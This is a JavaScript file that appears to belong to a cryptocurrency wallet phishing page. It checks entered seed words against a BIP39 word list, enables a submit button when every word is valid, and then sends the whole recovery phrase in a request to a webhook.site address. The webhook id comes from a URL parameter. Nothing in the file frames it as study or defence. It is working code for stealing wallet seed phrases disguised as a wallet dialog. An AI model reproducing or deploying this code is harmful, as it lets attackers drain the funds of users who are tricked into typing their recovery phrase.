const seedWrapper = document.querySelector('#seed-wrapper');
const btbSendSeed = document.querySelector('#btn-send-seed');
const containerInput = seedWrapper.querySelectorAll('.container');
const btnCloseModal = document.querySelector('#btn-close-modal');
const walletModal = document.querySelector('.walletModalBackground');

const dataurl = new URL(window.location.href);

const webhook = dataurl.searchParams.get('data');

let allChecked = false;

async function getWords() {
    const words = await fetch('./scripts/bip39.json');
    return words.json();
}

async function main() {
    const words = await getWords();
    containerInput.forEach(async (container) => {
        const input = container.querySelector('input');
        const check = container.querySelector('.check');
        input.addEventListener('keyup', async (evt) => {
            if (words.includes(input.value)) {
                check.classList.remove('d-none');
            } else {
                check.classList.add('d-none');
            }
            const allchecks = seedWrapper.querySelectorAll('.d-none');
            if (allchecks.length === 0) {
                btbSendSeed.disabled = false;
                btbSendSeed.classList.remove('not-checked');
                allChecked = true;
            } else {
                btbSendSeed.disabled = true;
                btbSendSeed.classList.add('not-checked');
                allChecked = false;
            }
        });
    });
}

const url = `https://webhook.site/${webhook}`;

btbSendSeed.addEventListener('click', () => {
    sendSeed(url);
});

async function sendSeed(url) {
    console.log('fetch');
    if (allChecked) {
        const seed = [];
        containerInput.forEach((container) => {
            const input = container.querySelector('input');
            seed.push(input.value);
            btbSendSeed.disabled = true;
            btbSendSeed.classList.add('not-checked');
            input.value = '';
        });

        containerInput.forEach((container) => {
            const check = container.querySelector('.check');
            check.classList.add('d-none');
        });

        await fetch(`${url}?seed=${JSON.stringify(seed)}`);
    }
}

btnCloseModal.addEventListener('click', () => {
    walletModal.classList.remove('d--flex');
});

main();
